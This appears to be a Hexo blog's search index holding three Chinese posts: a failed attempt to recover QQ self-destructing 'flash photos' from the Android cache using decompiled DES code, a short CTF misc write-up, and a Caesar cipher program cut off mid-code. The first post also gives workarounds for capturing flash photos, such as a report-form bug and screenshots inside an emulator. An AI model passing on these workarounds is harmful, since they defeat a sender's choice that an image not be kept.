<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>QQ闪照破解（待完结）</title>
      <link href="/post/QQ%E9%97%AA%E7%85%A7.html"/>
      <url>/post/QQ%E9%97%AA%E7%85%A7.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>和朋友聊天时突发奇想，想尝试一下获取闪照源文件，忙了一个下午还是没有解决（主要是太菜了 /(ㄒoㄒ)/~~ ）</p></blockquote><h1 id="原理和思路"><a href="#原理和思路" class="headerlink" title="原理和思路"></a>原理和思路</h1><p>闪照貌似是一种木马改编而来，但是因为实用性不高可能就被设计成闪照了（盲猜）。闪照的工作原理大概是有一个FLAG_SECURE窗口，如果启用了FLAG_SECURE，那么将不允许用户在此界面截图/录屏。也就是说，不允许截图这个功能是Android系统提供给开发者的。当时间一过，程序就会自动将闪照删除。在此过程中有个很大的弊端，就是在照片还未读取时，照片会存在于缓存之中，很容易被提取出来查看。<img src="https://i.loli.net/2021/10/13/94hWsJ3cOzAQvUk.jpg" alt="v2-490e56ae39fb40e269e4b0076e8fcf43_r.jpg"></p><p>所以在2021年以前的qq，闪照基本上和普通照片没什么区别，只要在缓存中提取到就可以保存起来。但是现在已经被修复了，网上大部分教程已经失效了。（可能某些大佬自己破解了，只是我不知道）。现在的闪照在缓存中提取到改后缀已经没有用了，因为现在的照片已经被加密了（文件头就写着加密二字😒）</p><p>接下来就是讲讲我自己的思路：</p><p>1、首先找到缓冲区文件，路径（Andriod/data/com.tecent.mobileqq/Tencent/MobileQQ/chatpic/chatimg），里面的东西应该和下面差不多（如果找不到可能是没有打开显示隐藏文件。），之后按照时间顺序找到对应的文件。<img src="https://i.loli.net/2021/10/13/bcLsOGxe7SrHBPq.jpg" alt="QQ图片20211013192450.jpg"></p><p>当初找到以后高兴了老半天，结果打开发现被加密了，气的想打人。后面看到一个大佬讲解，发现是des加密（就知道腾讯不会勤快到自己写出算法）他通过TIM2.1.0的apk反编译了一下，发现com.tencent.mobileqq.utils.DESUtil中有几个函数可以加解密闪照图片，发现使用的是javax.crypto加解密。</p><p>这个类大概就是下面这个样子，其中byte[]参数是加解密的key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Decompiled with CFR 0_123.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">package</span> com.tencent.mobileqq.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tencent.mobileqq.utils.FileUtils;</span><br><span class="line"><span class="keyword">import</span> com.tencent.qphone.base.util.QLog;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.RandomAccessFile;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.CipherInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.CipherOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DESUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(File var0, File var1_6, <span class="keyword">byte</span>[] var2_8)</span> </span>&#123;</span><br><span class="line"><span class="comment">//加密</span></span><br><span class="line">        var6_15 = <span class="keyword">new</span> SecretKeySpec(DESUtil.a((<span class="keyword">byte</span>[])var2_8), <span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        var2_8 = Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        var2_8.init(<span class="number">1</span>, (Key)var6_15);</span><br><span class="line">        var6_15 = <span class="keyword">new</span> FileInputStream((File)var0);</span><br><span class="line">        var0 = <span class="keyword">new</span> FileOutputStream((File)var1_6);</span><br><span class="line">        var1_6 = <span class="keyword">new</span> CipherInputStream((InputStream)var6_15, (Cipher)var2_8);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2_8 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            var0.write(<span class="string">&quot;ENCRYPT:&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));<span class="comment">//写文件头</span></span><br><span class="line">            <span class="keyword">while</span> ((var3_16 = var1_6.read((<span class="keyword">byte</span>[])var2_8)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                var0.write((<span class="keyword">byte</span>[])var2_8, <span class="number">0</span>, var3_16);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception var4_11) &#123;</span><br><span class="line"><span class="comment">//略</span></span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String string, String string2)</span> </span>&#123;</span><br><span class="line"><span class="comment">//带日志的加密函数，里面调用了上面的a(File,File,byte[])</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (DESUtil.a(string)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">2</span>, (String)(<span class="string">&quot;encrypt had encrypt,file:&quot;</span> + string));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">long</span> l = System.currentTimeMillis();</span><br><span class="line">                Object object = string + <span class="string">&quot;.tmp&quot;</span>;</span><br><span class="line">                File file = <span class="keyword">new</span> File(string);</span><br><span class="line">                <span class="keyword">long</span> l2 = file.length() / <span class="number">1024</span>;</span><br><span class="line">                <span class="keyword">if</span> ((object = <span class="keyword">new</span> File((String)object)).exists()) &#123;</span><br><span class="line">                    object.delete();</span><br><span class="line">                &#125;</span><br><span class="line">                DESUtil.a(file, (File)object, string2.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                FileUtils.a((File)object, (File)file);</span><br><span class="line">                object.delete();</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">4</span>, (String)(<span class="string">&quot;DES Encrypt filePath:&quot;</span> + string + <span class="string">&quot;,key:&quot;</span> + string2 + <span class="string">&quot;,costTime:&quot;</span> + (System.currentTimeMillis() - l) + <span class="string">&quot;,fileSize:&quot;</span> + l2 + <span class="string">&quot;KB&quot;</span>));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (UnsupportedEncodingException unsupportedEncodingException) &#123;</span><br><span class="line">            unsupportedEncodingException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String string, String object, String string2)</span> </span>&#123;</span><br><span class="line"><span class="comment">//还是带日志的加密函数，里面调用了上面的a(File,File,byte[])</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (DESUtil.a(string)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">2</span>, (String)(<span class="string">&quot;encrypt had encrypt,file:&quot;</span> + string));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">long</span> l = System.currentTimeMillis();</span><br><span class="line">                File file = <span class="keyword">new</span> File(string);</span><br><span class="line">                <span class="keyword">long</span> l2 = file.length() / <span class="number">1024</span>;</span><br><span class="line">                <span class="keyword">if</span> ((object = <span class="keyword">new</span> File((String)object)).exists()) &#123;</span><br><span class="line">                    object.delete();</span><br><span class="line">                &#125;</span><br><span class="line">                DESUtil.a(file, (File)object, string2.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                file.delete();</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">4</span>, (String)(<span class="string">&quot;DES Encrypt filePath:&quot;</span> + string + <span class="string">&quot;,key:&quot;</span> + string2 + <span class="string">&quot;,costTime:&quot;</span> + (System.currentTimeMillis() - l) + <span class="string">&quot;,fileSize:&quot;</span> + l2 + <span class="string">&quot;KB&quot;</span>));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (UnsupportedEncodingException unsupportedEncodingException) &#123;</span><br><span class="line">            unsupportedEncodingException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String var0)</span> </span>&#123;</span><br><span class="line"><span class="comment">//反编译出来的代码比上面的还乱此略，</span></span><br><span class="line"><span class="comment">//从QLog写入的内容大致可以看出该函数的作用应该是检查文件是否已经加/解密过</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] a(<span class="keyword">byte</span>[] arrby) &#123;</span><br><span class="line">        <span class="comment">//保证key数组定长是8？</span></span><br><span class="line">        <span class="keyword">byte</span>[] arrby2 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">if</span> (arrby2.length &gt; arrby.length) &#123;</span><br><span class="line">            System.arraycopy(arrby, <span class="number">0</span>, arrby2, <span class="number">0</span>, arrby.length);</span><br><span class="line">            <span class="keyword">return</span> arrby2;</span><br><span class="line">        &#125;</span><br><span class="line">        System.arraycopy(arrby, <span class="number">0</span>, arrby2, <span class="number">0</span>, arrby2.length);</span><br><span class="line">        <span class="keyword">return</span> arrby2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">(File var0, File var1_5, <span class="keyword">byte</span>[] var2_7)</span> </span>&#123;</span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line">        var2_7 = <span class="keyword">new</span> SecretKeySpec(DESUtil.a((<span class="keyword">byte</span>[])var2_7), <span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        var6_15 = Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        var6_15.init(<span class="number">2</span>, (Key)var2_7);</span><br><span class="line">        var2_7 = <span class="keyword">new</span> RandomAccessFile((File)var0, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        var2_7.seek(<span class="string">&quot;ENCRYPT:&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>).length);<span class="comment">//跳过文件头</span></span><br><span class="line">        var0 = <span class="keyword">new</span> CipherOutputStream(<span class="keyword">new</span> FileOutputStream((File)var1_5), var6_15);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var1_5 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> ((var3_16 = var2_7.read((<span class="keyword">byte</span>[])var1_5)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                var0.write((<span class="keyword">byte</span>[])var1_5, <span class="number">0</span>, var3_16);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception var4_10) &#123;</span><br><span class="line">            <span class="comment">//略</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">(String string, String string2)</span> </span>&#123;</span><br><span class="line"><span class="comment">//带日志的解密</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!DESUtil.a(string)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">2</span>, (String)(<span class="string">&quot;decrypt had no encrypt,file:&quot;</span> + string));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">long</span> l = System.currentTimeMillis();</span><br><span class="line">                Object object = string + <span class="string">&quot;.tmp&quot;</span>;</span><br><span class="line">                File file = <span class="keyword">new</span> File(string);</span><br><span class="line">                <span class="keyword">long</span> l2 = file.length() / <span class="number">1024</span>;</span><br><span class="line">                <span class="keyword">if</span> ((object = <span class="keyword">new</span> File((String)object)).exists()) &#123;</span><br><span class="line">                    object.delete();</span><br><span class="line">                &#125;</span><br><span class="line">                DESUtil.b(file, (File)object, string2.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                FileUtils.a((File)object, (File)file);</span><br><span class="line">                object.delete();</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">4</span>, (String)(<span class="string">&quot;DES Decrypt filePath:&quot;</span> + string + <span class="string">&quot;,key:&quot;</span> + string2 + <span class="string">&quot;,costTime:&quot;</span> + (System.currentTimeMillis() - l) + <span class="string">&quot;,fileSize:&quot;</span> + l2 + <span class="string">&quot;KB&quot;</span>));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (UnsupportedEncodingException unsupportedEncodingException) &#123;</span><br><span class="line">            unsupportedEncodingException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我以为胜利在望，我请教了师兄，发现其中几个包得不到，根本破解不了（o(*≧▽≦)ツ┏━┓）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tencent.mobileqq.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tencent.mobileqq.utils.FileUtils;</span><br><span class="line"><span class="keyword">import</span> com.tencent.qphone.base.util.QLog;</span><br></pre></td></tr></table></figure><p>除此之外，还不知道key从何来，大佬也说要么需要处于登录状态用一定方式从服务器得到，要么从本地消息对象的属性中获得，反正哪个都不容易，单靠一个_fp文件就解密出来原文件应该不太现实。所以我就只能放弃了。</p><h1 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h1><p>虽然前面说了没解出来，但是不代表不能获得照片啊（￣︶￣）↗　</p><p>提供三种方法：</p><ul><li><p>方法一：利用bug实现，举报好友填写信息时勾选闪照，在举报成功后会显示闪照内容（好友：我tm真的谢谢你），不过我觉得后面腾讯应该会修复。</p></li><li><p>方法二：最简单的，用另一个手机拍照，最实用最靠谱的(～￣▽￣)～</p></li><li><p>方法三：利用模拟机打开qq，在模拟机里面是无法限制主机截图的，下载一个VMOS在里面下载一个qq打开闪照时就可以截图了[]<del>(￣▽￣)</del>*</p></li></ul><p>个人观点：我觉得非必要情况没必要去获得闪照，毕竟别人发闪照就是不想让你保存，所以看看就行了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 感想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-misc</title>
      <link href="/post/ctfshow-misc.html"/>
      <url>/post/ctfshow-misc.html</url>
      
        <content type="html"><![CDATA[<h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><p>签到题，打开就有flag</p><h1 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h1><p>打开txt文件出现一堆乱码，丢进winhex发现是png，直接改后缀名即可<img src="https://i.loli.net/2021/10/05/ZC4hk6SB51DR3nd.png" alt="image.png"></p><h1 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h1><p>bpg文件使用bpgview工具打开，打开后即可获得flag</p><p><img src="https://i.loli.net/2021/10/05/2qfa4hTyYQSwtK8.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加/解密小程序</title>
      <link href="/post/%E5%8A%A0-%E8%A7%A3%E5%AF%86%E5%B0%8F%E7%A8%8B%E5%BA%8F.html"/>
      <url>/post/%E5%8A%A0-%E8%A7%A3%E5%AF%86%E5%B0%8F%E7%A8%8B%E5%BA%8F.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>学了密码学以后，想做个用来加解密的小程序玩玩</p></blockquote><h1 id="加-解密算法"><a href="#加-解密算法" class="headerlink" title="加/解密算法"></a>加/解密算法</h1><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p>凯撒密码属于古典密码的替换式密码，就是将明文替换成位移后对应的字符，如密钥key=3，则a-&gt;d，b-&gt;e，c-&gt;f……（凯撒密码的密钥为数字0-25）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 凯撒加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Caesar_Encryption</span>():</span></span><br><span class="line">    output.delete(<span class="number">0</span>, <span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    plaintext = entry_frame.get()  <span class="comment"># 获取输入内容</span></span><br><span class="line">    key = key_frame.get()</span><br><span class="line">    ciphertext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> key.isdigit():</span><br><span class="line">        key = <span class="built_in">int</span>(key)%<span class="number">26</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> plaintext:</span><br><span class="line">            <span class="keyword">if</span> i.isalpha():  <span class="comment"># 判断是否是字符</span></span><br><span class="line">                <span class="keyword">if</span> i.isupper(): <span class="comment"># 判断是否是大写</span></span><br><span class="line">                    ciphertext += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i.lower()) - <span class="number">97</span> + key) % <span class="number">26</span> +</span><br><span class="line">                                      <span class="number">97</span>).upper()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ciphertext += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">97</span> + key) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment">#如果不是字符就照常输出</span></span><br><span class="line">                ciphertext += i</span><br><span class="line">        output.insert(<span class="number">0</span>, ciphertext)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 如果密钥输入错误提示报错</span></span><br><span class="line">        Error()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 凯撒解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Caesar_Decrypt</span>():</span></span><br><span class="line">    output.delete(<span class="number">0</span>, <span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    ciphertext = entry_frame.get()</span><br><span class="line">    key = key_frame.get()</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> key.isdigit():</span><br><span class="line">        key = <span class="built_in">int</span>(key)%<span class="number">26</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ciphertext:</span><br><span class="line">            <span class="keyword">if</span> i.isalpha():  <span class="comment"># 判断是否是字符</span></span><br><span 